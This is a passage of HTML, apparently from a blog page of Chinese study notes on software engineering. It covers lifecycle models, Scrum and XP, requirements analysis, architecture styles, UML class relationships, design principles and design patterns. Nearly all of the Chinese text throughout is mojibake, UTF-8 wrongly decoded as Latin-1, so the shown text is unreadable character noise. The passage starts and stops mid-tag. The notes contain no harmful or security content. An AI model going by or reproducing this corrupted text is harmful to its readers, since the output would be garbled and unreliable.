href="#è½¯ä»¶å¼€å‘å„é˜¶æ®µæ´»åŠ¨åŠä»»åŠ¡" class="headerlink" title="è½¯ä»¶å¼€å‘å„é˜¶æ®µæ´»åŠ¨åŠä»»åŠ¡*"></a>è½¯ä»¶å¼€å‘å„é˜¶æ®µæ´»åŠ¨åŠä»»åŠ¡*</h2><ul><li>å¯è¡Œæ€§åˆ†æ ï¼š é«˜å±‚æ¬¡éœ€æ±‚åˆ†æ  - æŠ€æœ¯ï¼Œç»æµï¼Œç¤¾ä¼š</li><li>éœ€æ±‚åˆ†æï¼šè¿›è¡Œ<strong>å˜æ›´ç®¡ç†</strong> é€‚åº”å˜åŒ–ï¼Œåˆ†ä¸º<strong>åŠŸèƒ½æ€§</strong>å’Œ<strong>éåŠŸèƒ½æ€§</strong>ï¼Œè¾“å‡º<strong>éœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦</strong></li><li>è½¯ä»¶è®¾è®¡ï¼šæ¦‚è¦+è¯¦ç»†</li><li>ç¨‹åºç¼–ç </li><li>è½¯ä»¶æµ‹è¯•ï¼š å•å…ƒ-&gt;é›†æˆ-&gt;ç³»ç»Ÿï¼Œåˆ†ä¸ºé»‘ç›’å’Œç™½ç›’</li><li>è½¯ä»¶ç»´æŠ¤:  æ”¹æ­£æ€§ï¼Œé€‚åº”æ€§ï¼Œå®Œå–„æ€§ï¼Œé¢„é˜²æ€§</li></ul><h2 id="ç”Ÿå‘½å‘¨æœŸæ¨¡å‹"><a href="#ç”Ÿå‘½å‘¨æœŸæ¨¡å‹" class="headerlink" title="ç”Ÿå‘½å‘¨æœŸæ¨¡å‹"></a>ç”Ÿå‘½å‘¨æœŸæ¨¡å‹</h2><h3 id="ç€‘å¸ƒæ¨¡å‹"><a href="#ç€‘å¸ƒæ¨¡å‹" class="headerlink" title="ç€‘å¸ƒæ¨¡å‹*"></a>ç€‘å¸ƒæ¨¡å‹*</h3><p>ä¼ ç»Ÿå¼€å‘æ–¹æ³• <strong>æœ€å¹¿æ³›</strong>ï¼Œé¡ºåºæ€§ï¼Œä¾èµ–æ€§</p><p>æ¨è¿Ÿå†™ä»£ç ï¼Œæ¯ä¸ªé˜¶æ®µéƒ½å†™æ–‡æ¡£</p><p>ç¼ºç‚¹ï¼šç”¨æˆ·å‚ä¸å°‘ï¼Œé™æ€</p><h3 id="å¿«é€ŸåŸå‹æ¨¡å‹"><a href="#å¿«é€ŸåŸå‹æ¨¡å‹" class="headerlink" title="å¿«é€ŸåŸå‹æ¨¡å‹*"></a>å¿«é€ŸåŸå‹æ¨¡å‹*</h3><p>çœ‹å</p><p>ä¼˜ç‚¹ï¼š ç”¨æˆ·å‚ä¸å¤šäº†</p><p>ç¼ºç‚¹ï¼š åŸå‹å¤§æ¦‚ç‡æŠ›å¼ƒ</p><h4 id="å¢é‡æ¨¡å‹"><a href="#å¢é‡æ¨¡å‹" class="headerlink" title="å¢é‡æ¨¡å‹"></a>å¢é‡æ¨¡å‹</h4><p>åˆ†ä¸ºåŠŸèƒ½æ¨¡å—ï¼Œé€æ­¥å®ç°ï¼ˆå¼€æ”¾æ¶æ„ï¼‰</p><h4 id="èºæ—‹æ¨¡å‹"><a href="#èºæ—‹æ¨¡å‹" class="headerlink" title="èºæ—‹æ¨¡å‹"></a>èºæ—‹æ¨¡å‹</h4><p>ç€‘å¸ƒ+å¿«é€ŸåŸå‹+é£é™©åˆ†æ</p><p>æ¯é˜¶æ®µå¢åŠ é£é™©åˆ†æï¼Œé™ä½é£é™©</p><h3 id="å–·æ³‰æ¨¡å‹"><a href="#å–·æ³‰æ¨¡å‹" class="headerlink" title="å–·æ³‰æ¨¡å‹*"></a>å–·æ³‰æ¨¡å‹*</h3><p>è¿­ä»£å’Œæ— ç¼</p><p>æ€»ç›®æ ‡ï¼š çº¿æ€§è¿‡ç¨‹</p><p><strong>è¿­ä»£</strong>* é€æ­¥æ±‚ç²¾ï¼Œé¢å‘å¯¹è±¡</p><h2 id="æ•æ·"><a href="#æ•æ·" class="headerlink" title="æ•æ·"></a>æ•æ·</h2><h3 id="æ•æ·å®£è¨€"><a href="#æ•æ·å®£è¨€" class="headerlink" title="æ•æ·å®£è¨€"></a>æ•æ·å®£è¨€</h3><ul><li>ä¸ªä½“+äº’åŠ¨ &gt; æµç¨‹+å·¥å…·</li><li>è½¯ä»¶ &gt; æ–‡æ¡£</li><li>å®¢æˆ·åˆä½œ &gt; åˆåŒè°ˆåˆ¤</li><li>ç›¸åº”å˜åŒ– &gt; éµå¾ªè®¡åˆ’</li></ul><h3 id="å¢é‡-å’Œ-è¿­ä»£"><a href="#å¢é‡-å’Œ-è¿­ä»£" class="headerlink" title="å¢é‡ å’Œ è¿­ä»£"></a>å¢é‡ å’Œ è¿­ä»£</h3><p>ç³»ç»Ÿç”±ä¸‰ä¸ªæ¨¡å—æ„æˆï¼Œ </p><ul><li><p>å¢é‡ï¼šä¸€ä¸ªä¸ªå®ç° ã€‚ </p></li><li><p>è¿­ä»£ï¼Œå®ç°ä¸‰ä¸ªåƒåœ¾æ¨¡å—ï¼Œå†ä¸€æ­¥æ­¥æ±‚ç²¾ã€‚</p></li></ul><h3 id="SCRUM"><a href="#SCRUM" class="headerlink" title="SCRUM*"></a>SCRUM*</h3><p><strong>å†²åˆº Sprint</strong> ï¼š ä¸€ä¸ªå·¥ä½œå‘¨æœŸ</p><ul><li>äº§å“è®¢å•ï¼š é¡¹ç›®çš„æ¦‚è¦æ–‡æ¡£ï¼Œä»¥å¤©ä¸ºå•ä½</li><li>å†²åˆºè®¢å• ï¼š å°æ–‡æ¡£ï¼Œä»¥16å°æ—¶ä¸ºå•ä½</li><li>ç‡ƒå°½å›¾ï¼š to-do list</li></ul><p>è§’è‰²</p><ul><li>äº§å“æ‹¥æœ‰è€… ï¼š ç”²æ–¹é¢†å¯¼</li><li>åˆ©ç›Šç›¸å…³è€… ï¼š å®¢æˆ·</li><li>ä¸“å®¶ ï¼š æŠ€æœ¯æ€»ç›‘</li><li>å›¢é˜Ÿæˆå‘˜ ï¼š ç¨‹åºå‘˜</li></ul><p>æ´»åŠ¨</p><ul><li>è®¡åˆ’ä¼šï¼š å†²åˆºåˆåˆ¶å®šè®¡åˆ’</li><li>æ¯æ—¥ç«‹ä¼šï¼š æ¯å¤©15åˆ†é’Ÿ</li><li>è¯„å®¡ä¼šï¼š å†²åˆºç»“æŸå‰</li><li>åæ€ä¼š/å›é¡¾ä¼š ï¼š å†²åˆºç»“æŸå</li></ul><p>XP äº SCRUM åŒºåˆ«</p><table><thead><tr><th></th><th>XP</th><th>SCRUM</th></tr></thead><tbody><tr><td>è¿­ä»£é•¿åº¦</td><td>1-2å‘¨</td><td>3-4å‘¨</td></tr><tr><td>è¿­ä»£ä¸­æ˜¯å¦å…è®¸ä¿®æ”¹éœ€æ±‚</td><td>yes</td><td>no</td></tr><tr><td>è¿­ä»£ä¸­æ˜¯å¦æŒ‰ä¼˜å…ˆçº§å®ç°</td><td>yes</td><td>no</td></tr><tr><td>æ˜¯å¦é‡‡ç”¨ä¸¥æ ¼å·¥ç¨‹æ–¹æ³•ï¼Œä¿è¯è¿›åº¦è´¨é‡</td><td>yes</td><td>no</td></tr></tbody></table><h4 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h4><p>è‡ªåŠ¨åŒ–ï¼Œé«˜åº¦ä¾èµ–å·¥å…·</p><h2 id="éœ€æ±‚åˆ†æ"><a href="#éœ€æ±‚åˆ†æ" class="headerlink" title="éœ€æ±‚åˆ†æ"></a>éœ€æ±‚åˆ†æ</h2><h3 id="ç”¨æˆ·-amp-ç³»ç»Ÿ"><a href="#ç”¨æˆ·-amp-ç³»ç»Ÿ" class="headerlink" title="ç”¨æˆ· &amp; ç³»ç»Ÿ"></a>ç”¨æˆ· &amp; ç³»ç»Ÿ</h3><ul><li>ç³»ç»Ÿéœ€æ±‚æ˜¯å¯¹ç”¨æˆ·éœ€æ±‚çš„ç»†åŒ–å’Œå®Œå–„</li><li>ç³»ç»Ÿéœ€æ±‚çš„é˜…è¯»å¯¹è±¡æ˜¯å¼€å‘è€…ï¼Œç”¨æˆ·éœ€æ±‚æ˜¯å®¢æˆ·</li><li>ç³»ç»Ÿéœ€æ±‚æ˜¯ç”¨æˆ·éœ€æ±‚çš„å¼€å§‹</li><li>ç›®æ ‡ &amp; æ¶‰ä¼—</li></ul><h3 id="æ¶‰ä¼—"><a href="#æ¶‰ä¼—" class="headerlink" title="æ¶‰ä¼—"></a>æ¶‰ä¼—</h3><p>ä¸ç›®æ ‡ç³»ç»Ÿç›¸å…³çš„ä¸€åˆ‡äººå’Œç‰©</p><h3 id="ç³»ç»ŸåŠŸèƒ½çš„ç¡®å®š"><a href="#ç³»ç»ŸåŠŸèƒ½çš„ç¡®å®š" class="headerlink" title="ç³»ç»ŸåŠŸèƒ½çš„ç¡®å®š"></a>ç³»ç»ŸåŠŸèƒ½çš„ç¡®å®š</h3><p><strong>æ­£å¼</strong>å’Œ<strong>éæ­£å¼</strong>çš„<strong>è®¿è°ˆ</strong></p><h3 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h3><p>ç”¨ä¾‹-&gt;è§„çº¦ç”¨ä¾‹å¹¶ç”Ÿæˆæ–‡æ¡£-&gt;æ´»åŠ¨å›¾-&gt;æ–‡å­—åŠŸèƒ½æ€§éœ€æ±‚</p><h4 id="ä¸‰ç§åŠŸèƒ½æ€§éœ€æ±‚"><a href="#ä¸‰ç§åŠŸèƒ½æ€§éœ€æ±‚" class="headerlink" title="ä¸‰ç§åŠŸèƒ½æ€§éœ€æ±‚"></a>ä¸‰ç§åŠŸèƒ½æ€§éœ€æ±‚</h4><p>ç³»ç»ŸåŠŸèƒ½éœ€æ±‚ + äº¤äº’éœ€æ±‚ + å¤–éƒ¨æ¥å£éœ€æ±‚</p><h4 id="éœ€æ±‚è¯´æ˜ä¹¦"><a href="#éœ€æ±‚è¯´æ˜ä¹¦" class="headerlink" title="éœ€æ±‚è¯´æ˜ä¹¦"></a>éœ€æ±‚è¯´æ˜ä¹¦</h4><p>æ–‡æ¡£+æ¶‰ä¼—+ç›®æ ‡+åŠŸèƒ½ï¼ŒéåŠŸèƒ½+äº¤ä»˜ç‰©+éªŒæ”¶æ ‡å‡†+é™„ä»¶</p><h4 id="éœ€æ±‚è·Ÿè¸ª"><a href="#éœ€æ±‚è·Ÿè¸ª" class="headerlink" title="éœ€æ±‚è·Ÿè¸ª"></a>éœ€æ±‚è·Ÿè¸ª</h4><p>ä¸šåŠ¡ï¼Œâ€”â€“éœ€æ±‚ï¼Œ ç±»æ¨¡å‹  ä¸‰è€…é€’å½’ç¡®å®šï¼Œäº’æœ‰å¯¹åº”</p><p>   |â€”â€”â€”â€”-| â€”â€”â€”|  -</p><p>æ´»åŠ¨å›¾ï¼Œéœ€æ±‚æ–‡æ¡£ï¼Œç±»å›¾</p><p>æé«˜å®Œå¤‡æ€§ï¼ŒåŒæ—¶æ£€æŸ¥æ˜¯å¦æœ‰å†—ä½™ï¼ˆæœ‰æ²¡æœ‰ç¼ºçš„ï¼Œå¤šçš„ï¼‰</p><h2 id="è½¯ä»¶æ¶æ„"><a href="#è½¯ä»¶æ¶æ„" class="headerlink" title="è½¯ä»¶æ¶æ„"></a>è½¯ä»¶æ¶æ„</h2><h4 id="åŸºæœ¬å…ƒç´ "><a href="#åŸºæœ¬å…ƒç´ " class="headerlink" title="åŸºæœ¬å…ƒç´ "></a>åŸºæœ¬å…ƒç´ </h4><p>æ„ä»¶ + è¿æ¥ä»¶ + é…ç½®</p><h3 id="æ•°æ®æµé£æ ¼"><a href="#æ•°æ®æµé£æ ¼" class="headerlink" title="æ•°æ®æµé£æ ¼"></a>æ•°æ®æµé£æ ¼</h3><p><strong>ç®¡é“ä¸è¿‡æ»¤å™¨</strong>ï¼š ä¿¡æ¯éšè—ï¼Œé«˜å†…èšä½è€¦åˆï¼Œå¯ä»¥çµæ´»ç»„åˆ</p><p><strong>å±‚æ¬¡ç³»ç»Ÿ</strong> ï¼šè®¡ç®—æœºç½‘ç»œ</p><p><strong>æ­£äº¤è½¯ä»¶æ¶æ„</strong>ï¼š</p><ul><li><p>å±‚ ï¼š ä¸€ç»„å…·æœ‰ç›¸åŒæŠ½è±¡çº§åˆ«çš„æ„ä»¶</p></li><li><p>çº¿ç´¢ï¼š ç”¨ä¾‹å½¢æˆçš„è°ƒç”¨å…³ç³»</p></li><li><p>å¥½å¤„ï¼šæ¯ä¸ªéœ€æ±‚å˜åŠ¨ä»…å½±å“æŸä¸€æ¡çº¿ç´¢</p></li></ul><p><strong>å®¢æˆ·æœºæœåŠ¡å™¨æ¶æ„</strong>: </p><ul><li>ä¸€ä¸ªæœåŠ¡å™¨æœåŠ¡å¤šä¸ªå®¢æˆ·ç«¯</li><li>é€‚åº”å˜åŒ–ï¼Œçµæ´»</li><li>æ˜“äºå¯¹ç³»ç»Ÿè¿›è¡Œæ‰©å……å’Œç¼©å°</li><li>åŠŸèƒ½æ„å»ºéš”ç¦»</li></ul><p><strong>æµè§ˆå™¨/æœåŠ¡å™¨æ¶æ„</strong> : åŸºæœ¬åŒä¸Š+æŠ½å–clientçš„functionå½¢æˆçš„webæœåŠ¡å™¨</p><h3 id="ç‹¬ç«‹æ„å»ºé£æ ¼"><a href="#ç‹¬ç«‹æ„å»ºé£æ ¼" class="headerlink" title="ç‹¬ç«‹æ„å»ºé£æ ¼"></a>ç‹¬ç«‹æ„å»ºé£æ ¼</h3><h4 id="MVCæ¶æ„"><a href="#MVCæ¶æ„" class="headerlink" title="MVCæ¶æ„*"></a>MVCæ¶æ„*</h4><ul><li><p>Model: ä¼ä¸šæ•°æ®å’Œä¸šåŠ¡è§„åˆ™</p></li><li><p>Viewï¼šç”¨æˆ·çœ‹åˆ°å¹¶ä¸ä¹‹äº¤äº’çš„ç•Œé¢</p></li><li><p>Controllerï¼šæ ¹æ®è¾“å…¥è°ƒç”¨æ¨¡å‹å’Œè§†å›¾å»å®Œæˆç”¨æˆ·çš„éœ€æ±‚ï¼Œä¸è¾“å‡ºç»“æœï¼Œä¸åšä»»ä½•å¤„ç†</p></li></ul><h3 id="æ•°æ®ä¸­å¿ƒé£æ ¼-ä»“åº“ç³»ç»Ÿ"><a href="#æ•°æ®ä¸­å¿ƒé£æ ¼-ä»“åº“ç³»ç»Ÿ" class="headerlink" title="æ•°æ®ä¸­å¿ƒé£æ ¼ - ä»“åº“ç³»ç»Ÿ"></a>æ•°æ®ä¸­å¿ƒé£æ ¼ - ä»“åº“ç³»ç»Ÿ</h3><p>æ˜Ÿå‹ç»“æ„ï¼Œä¸­å¤®æ•°æ®åº“å’Œå‘¨è¾¹client</p><p>é»‘æ¿ç³»ç»Ÿï¼šä¸­å¤®æ•°æ®åº“å°†çŠ¶æ€é€šçŸ¥clientï¼Œç”±clientå†³å®šé€‰æ‹©</p><h2 id="ç±»çš„åˆ†æä¸è®¾è®¡"><a href="#ç±»çš„åˆ†æä¸è®¾è®¡" class="headerlink" title="ç±»çš„åˆ†æä¸è®¾è®¡"></a>ç±»çš„åˆ†æä¸è®¾è®¡</h2><p>è¿­ä»£é€çº§ç»†åŒ–</p><h4 id="ç±»çš„ç§ç±»"><a href="#ç±»çš„ç§ç±»" class="headerlink" title="ç±»çš„ç§ç±»"></a>ç±»çš„ç§ç±»</h4><ul><li>å®ä½“ç±»ï¼šå­˜å‚¨ï¼Œä¼ é€’æ•°æ®çš„ç±»ï¼Œåè¯</li><li>æ§åˆ¶ç±»ï¼šç®¡ç†ç±»ï¼Œä½“ç°æ‰§è¡Œé€»è¾‘ï¼ŒåŠ¨å®¾</li><li>è¾¹ç•Œç±»ï¼šå¤–éƒ¨ç”¨æˆ·äº¤äº’ï¼Œç•Œé¢ç±»ï¼Œæ•°æ®äº¤æ¢ç±»</li></ul><h4 id="é¢†åŸŸæ¨¡å‹"><a href="#é¢†åŸŸæ¨¡å‹" class="headerlink" title="é¢†åŸŸæ¨¡å‹"></a>é¢†åŸŸæ¨¡å‹</h4><p>åˆå§‹ç±»å›¾-å®ä½“ç±»</p><h5 id="å®ä½“ç±»-lt-lt-entity-gt-gt"><a href="#å®ä½“ç±»-lt-lt-entity-gt-gt" class="headerlink" title="å®ä½“ç±» &lt;&lt;entity&gt;&gt;"></a>å®ä½“ç±» <code>&lt;&lt;entity&gt;&gt;</code></h5><ul><li>ç±»å ï¼š æ„é€ æ€§</li><li>å˜é‡ï¼š<ul><li>å¯è§æ€§ (private , public ..) - (-,+,_,~)</li><li>ä¾èµ–ï¼ˆè®¡ç®—ï¼‰å±æ€§ï¼Œ(/)</li><li>åå­— ï¼š </li><li>ç±»å‹ ï¼š UMLå®šä¹‰çš„ï¼Œint Stringâ€¦</li><li>ä¸‹åˆ’çº¿ï¼šè¡¨ç¤ºé™æ€</li></ul></li></ul><p>æ²¡æœ‰æ–¹æ³•</p><h4 id="ç±»çš„å…³ç³»"><a href="#ç±»çš„å…³ç³»" class="headerlink" title="ç±»çš„å…³ç³»*"></a>ç±»çš„å…³ç³»*</h4><ul><li>å…³è”å…³ç³» ï¼š é™æ€ï¼Œæ‹¥æœ‰ï¼Œé•¿æœŸæŒä¹…</li><li>å¯¼èˆªæ–¹å‘ ï¼š ç®­å¤´ ï¼Œ åŒ…å«å…³ç³»</li><li>ä¾èµ–å…³ç³» ï¼š åŠ¨æ€ï¼Œä¸´æ—¶ - é¿å…åŒå‘ä¾èµ–</li><li>ä¾èµ– åŒ…å« å…³è”</li></ul><h4 id="å¯¹è±¡"><a href="#å¯¹è±¡" class="headerlink" title="å¯¹è±¡"></a>å¯¹è±¡</h4><ul><li><u>å¯¹è±¡åï¼šç±»çš„ç±»å‹</u></li><li>å®ä¾‹å˜é‡ = åˆå§‹å€¼</li><li>å¯¹è±¡åä¸ºç©ºä»£è¡¨åŒ¿åå¯¹è±¡ï¼Œç±»åä¸ºç©ºä»£è¡¨æœ‰ä¸Šä¸‹æ–‡</li></ul><h4 id="ç®¡ç†ç±»-amp-æ§åˆ¶ç±»"><a href="#ç®¡ç†ç±»-amp-æ§åˆ¶ç±»" class="headerlink" title="ç®¡ç†ç±» &amp; æ§åˆ¶ç±»"></a>ç®¡ç†ç±» &amp; æ§åˆ¶ç±»</h4><table><thead><tr><th></th><th>ç®¡ç†ç±»</th><th>æ§åˆ¶ç±»</th></tr></thead><tbody><tr><td></td><td>ä¸è€ƒè™‘getï¼Œsetæ–¹æ³•</td><td>éš”ç¦»è¾¹ç•Œä¸å®ä½“</td></tr><tr><td>å¯¹è±¡</td><td>å¯¹äºåŒç±»å¯¹è±¡çš„åè°ƒå’Œç®¡ç†</td><td>ä¸åŒç±»</td></tr><tr><td>å±‚</td><td>Domainå±‚</td><td>ä¸šåŠ¡æ§åˆ¶å±‚</td></tr><tr><td>ä½œç”¨</td><td>åˆ›å»ºå¯¹è±¡ï¼Œä»£ç†è®¿é—®å…¶ä»–å¯¹è±¡</td><td>ä¸€ä¸ªç”¨ä¾‹ä¸€ä¸ª</td></tr></tbody></table><h4 id="ä¼˜åŒ–"><a href="#ä¼˜åŒ–" class="headerlink" title="ä¼˜åŒ–"></a>ä¼˜åŒ–</h4><p>åˆ©ç”¨æŠ½è±¡ç±»éš”ç¦»å˜åŒ–</p><p>ç©ºä¸‰è§’ç®­å¤´è¡¨ç¤ºç»§æ‰¿</p><h4 id="æšä¸¾ç±»-lt-lt-enumeration-gt-gt"><a href="#æšä¸¾ç±»-lt-lt-enumeration-gt-gt" class="headerlink" title="æšä¸¾ç±» &lt;&lt;enumeration&gt;&gt;"></a>æšä¸¾ç±» <code>&lt;&lt;enumeration&gt;&gt;</code></h4><h4 id="ç•Œé¢è®¾è®¡ï¼š"><a href="#ç•Œé¢è®¾è®¡ï¼š" class="headerlink" title="ç•Œé¢è®¾è®¡ï¼š"></a>ç•Œé¢è®¾è®¡ï¼š</h4><p>å¯¹å®ä½“ï¼Œç”Ÿæˆ <code>ProjectMask</code> ä»£ç†ç±»</p><h4 id="CASEå·¥å…·"><a href="#CASEå·¥å…·" class="headerlink" title="CASEå·¥å…·"></a>CASEå·¥å…·</h4><p>è½¯ä»¶å¼€å‘ç¯å¢ƒï¼Œè®¡ç®—æœºè¾…åŠ©è½¯ä»¶å·¥ç¨‹</p><h2 id="ç±»çš„å…³ç³»-1"><a href="#ç±»çš„å…³ç³»-1" class="headerlink" title="ç±»çš„å…³ç³»"></a>ç±»çš„å…³ç³»</h2><h4 id="é›†åˆç±»å‹"><a href="#é›†åˆç±»å‹" class="headerlink" title="é›†åˆç±»å‹"></a>é›†åˆç±»å‹</h4><table><thead><tr><th>æ˜¯å¦è¦æ±‚é¡ºåº</th><th>æ˜¯å¦è¦æ±‚å”¯ä¸€æ€§</th><th></th></tr></thead><tbody><tr><td>no</td><td>yes</td><td>Set</td></tr><tr><td>no</td><td>no</td><td>Bag/Multiset</td></tr><tr><td>yes</td><td>yes</td><td>OrderedSet</td></tr><tr><td>yes</td><td>no</td><td>List/Sequence</td></tr></tbody></table><p>é€‚ç”¨æ¨¡æ¿ç±»è€Œéå…·ä½“ç±»</p><h4 id="èšåˆ-èšé›†"><a href="#èšåˆ-èšé›†" class="headerlink" title="èšåˆ - èšé›†"></a>èšåˆ - èšé›†</h4><p>éƒ¨åˆ†ä¸æ•´ä½“ï¼Œå…±äº«</p><h4 id="ç»„åˆ"><a href="#ç»„åˆ" class="headerlink" title="ç»„åˆ"></a>ç»„åˆ</h4><p>å­˜åœ¨ä¾èµ–æ€§ - åŒç”Ÿå…±æ­»</p><h4 id="ä¾èµ–"><a href="#ä¾èµ–" class="headerlink" title="ä¾èµ–"></a>ä¾èµ–</h4><p>è®¿é—®çš„ç¬æ—¶æ€§ - ç”¨å‚æ•°</p><h2 id="ç±»çš„è¯¦ç»†è®¾è®¡"><a href="#ç±»çš„è¯¦ç»†è®¾è®¡" class="headerlink" title="ç±»çš„è¯¦ç»†è®¾è®¡"></a>ç±»çš„è¯¦ç»†è®¾è®¡</h2><p>ç®—æ³•+æ•°æ®ç»“æ„+ç‰©ç†ç»“æ„</p><p>å…¶ä»–è®¾è®¡+è¯¦ç»†è®¾è®¡è¯´æ˜ä¹¦+è¯„å®¡</p><p>ä»€ä¹ˆæ˜¯ç»“æ„åŒ–çš„ç¨‹åº</p><h4 id="ç›’å›¾"><a href="#ç›’å›¾" class="headerlink" title="ç›’å›¾"></a>ç›’å›¾</h4><p>å›¾ä¾‹ï¼šä¸å…è®¸éšæ„è·³è½¬ - å‘é‡ŒåµŒå¥—</p><h4 id="PADå›¾"><a href="#PADå›¾" class="headerlink" title="PADå›¾"></a>PADå›¾</h4><p>é—®é¢˜åˆ†æå›¾ - å‘å³åµŒå¥—</p><h4 id="åˆ¤å®šè¡¨"><a href="#åˆ¤å®šè¡¨" class="headerlink" title="åˆ¤å®šè¡¨"></a>åˆ¤å®šè¡¨</h4><p>ä½¿ç”¨â€œâ€”â€æ¥è¡¨ ç¤ºå¯¹æ­¤æ¡ä»¶çš„ä¸å…³å¿ƒæˆ–ä¸é€‚ç”¨</p><p>åˆ¤å®šæ ‘ï¼š ç»“ç‚¹-é€‰æ‹©ï¼Œå¶å­-ç»“æœ</p><h4 id="PDL"><a href="#PDL" class="headerlink" title="PDL"></a>PDL</h4><p>äººè¯ç‰ˆçš„Cè¯­è¨€</p><h4 id="OCL-ï¼Ÿ"><a href="#OCL-ï¼Ÿ" class="headerlink" title="OCL ï¼Ÿ"></a>OCL ï¼Ÿ</h4><p>å†çœ‹çœ‹</p><h2 id="è®¾è®¡ä¼˜åŒ–"><a href="#è®¾è®¡ä¼˜åŒ–" class="headerlink" title="è®¾è®¡ä¼˜åŒ–"></a>è®¾è®¡ä¼˜åŒ–</h2><h4 id="smell"><a href="#smell" class="headerlink" title="smell"></a>smell</h4><p>åƒµåŒ–æ€§ï¼Œè„†å¼±æ€§ï¼Œé¡½å›ºæ€§ï¼Œç²˜æ»æ€§ï¼Œå¤æ‚ï¼Œé‡å¤ï¼Œæ™¦æ¶©</p><h4 id="é‡å†™"><a href="#é‡å†™" class="headerlink" title="é‡å†™"></a>é‡å†™</h4><ul><li>ä¸çˆ¶ç±»æ–¹æ³•æœ‰ç›¸ä¼¼çš„è¡Œä¸ºï¼Œç»†èŠ‚è°ƒæ•´</li><li>ç›¸åŒæ¡ä»¶å·¥ä½œï¼Œå­ç±»ä¸åº”å…·æœ‰æ¯”å…¶çˆ¶ç±»æ›´ä¸¥æ ¼çš„æ¡ä»¶é™åˆ¶ - <strong>Liskovæ›¿æ¢åŸåˆ™</strong></li><li>é‡å†™çš„æ–¹æ³•æœ€é«˜ä¸èƒ½è¶…å‡ºçˆ¶ç±»æ–¹æ³•çš„çŠ¶æ€ã€‚</li></ul><p>å¾ªç¯ä¾èµ–ï¼šæå–æ¥å£</p><p>ç‹æ˜µå…³ç³»ï¼š ä¸¤ä¸ªç±»è¿‡åˆ†äº²å¯†ï¼Œé«˜è€¦åˆ</p><p>æ¥å£éš”ç¦»åŸåˆ™ï¼šæ¥å£çš„ç¨³å®šï¼Œé€‚åº”å˜åŒ–ï¼ŒåŒä¸€ä¸ªç±»æå–ä¸åŒçš„æ¥å£</p><p>ä¾èµ–å€’ç½®åŸåˆ™ï¼šä¾èµ–äºæŠ½è±¡</p><p>å¼€æ”¾å°é—­åŸåˆ™ï¼š æ‰©å±•å¼€æ”¾ï¼Œä¿®æ”¹å°é—­</p><p>å•ä¸€èŒè´£åŸåˆ™ï¼šå•ä¸€åŠŸèƒ½</p><p>åˆæˆ/èšåˆå¤ç”¨åŸåˆ™ï¼šå°½é‡ä½¿ç”¨åˆæˆ/èšåˆ å½¢å¼çš„å§”æ‰˜é‡ç”¨ï¼Œå°½é‡ä¸ä½¿ç”¨ç»§æ‰¿é‡ç”¨</p><blockquote><p>å­ç±»æ˜¯çˆ¶ç±»çš„ç‰¹æ®Šç±»å‹</p></blockquote><h3 id="æ¨¡å¼"><a href="#æ¨¡å¼" class="headerlink" title="æ¨¡å¼"></a>æ¨¡å¼</h3><ul><li>æ¶æ„æ¨¡å¼ï¼š MVCï¼Œå±‚æ¬¡ç­‰</li><li>è®¾è®¡æ¨¡å¼ï¼šæŠ½è±¡å·¥ç¨‹ä¹‹ç±»çš„</li><li>å®ç°æ¨¡å¼ï¼šå…·ä½“åˆ°å†™ä»£ç ï¼Œç±»åï¼Œå˜é‡åï¼Œå‡½æ•°åã€‚ã€‚</li></ul><table><thead><tr><th></th><th>åˆ›å»ºæ¨¡å¼</th><th>ç»“æ„æ¨¡å¼</th><th>è¡Œä¸ºæ¨¡å¼</th></tr></thead><tbody><tr><td>ç±»</td><td>æŠ½è±¡å·¥å‚</td><td>é€‚é…å™¨</td><td>è§‚å¯Ÿè€…æ¨¡å¼</td></tr><tr><td>ç±»</td><td>å•ä¾‹</td><td>æ¡¥ - è£…é¥°</td><td>ç­–ç•¥æ¨¡å¼</td></tr><tr><td>ç±»</td><td></td><td>ä»£ç†</td><td>çŠ¶æ€</td></tr><tr><td>ç±»</td><td></td><td>é—¨é¢</td><td></td></tr></tbody></table><h5 id="æŠ½è±¡å·¥å‚æ¨¡å¼"><a href="#æŠ½è±¡å·¥å‚æ¨¡å¼" class="headerlink" title="æŠ½è±¡å·¥å‚æ¨¡å¼"></a>æŠ½è±¡å·¥å‚æ¨¡å¼</h5><p>å·¥å‚è¡¨ç¤ºä¸€ç»„äº§å“çš„æ‰“åŒ…ï¼Œä¸åŒçš„å·¥å‚å¯¹åº”ä¸åŒçš„ç»„åˆ</p><p>æŠ½è±¡å·¥å‚æ˜¯ä¸€ä¸ªæ¥å£ï¼Œç”¨äºç”Ÿæˆä¸€ç»„å¯¹è±¡ï¼Œå®é™…å¯¹è±¡æ ¹æ®ç±»åˆ«åˆæœ‰è‡ªå·±çš„æ¥å£</p><p>ä½è€¦åˆï¼Œä¸”æ·»åŠ æ–°çš„æ›´å®¹æ˜“</p><h4 id="å•ä¾‹æ¨¡å¼"><a href="#å•ä¾‹æ¨¡å¼" class="headerlink" title="å•ä¾‹æ¨¡å¼"></a>å•ä¾‹æ¨¡å¼</h4><p>ç®¡ç†ç±»æˆ–æ§åˆ¶ç±»ç³»ç»Ÿä¸­åªéœ€è¦ä¸€ä¸ªå®ä¾‹ï¼Œè¯¥å®ä¾‹åœ¨ç¨‹åºä¸­è¢«åˆ›å»º</p><p>è¦æ±‚ç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œæœ‰å…¬æœ‰çš„æ–¹æ³•è·å–è¯¥ç±»çš„å®ä¾‹ï¼Œå®ä¾‹å˜é‡ä¸ºç§æœ‰æˆ–å—ä¿æŠ¤çš„ã€‚</p><h4 id="é€‚é…å™¨æ¨¡å¼"><a href="#é€‚é…å™¨æ¨¡å¼" class="headerlink" title="é€‚é…å™¨æ¨¡å¼"></a>é€‚é…å™¨æ¨¡å¼</h4><p>åˆ©ç”¨ é€‚é…å™¨è¿›è¡Œæ¥å£çš„è½¬æ¢</p><h4 id="æ¡¥æ¨¡å¼"><a href="#æ¡¥æ¨¡å¼" class="headerlink" 